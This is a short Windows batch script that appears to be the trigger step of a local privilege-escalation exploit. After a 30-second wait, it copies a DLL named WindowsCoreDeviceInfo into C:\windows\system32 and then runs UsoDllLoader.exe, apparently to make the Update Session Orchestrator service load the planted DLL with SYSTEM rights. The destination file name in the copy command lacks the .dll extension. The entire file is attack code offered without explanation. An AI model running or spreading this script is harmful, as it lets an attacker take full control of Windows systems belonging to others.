@echo off 
timeout 30
copy /Y WindowsCoreDeviceInfo.dll C:\windows\system32\WindowsCoreDeviceInfo
UsoDllLoader.exe 

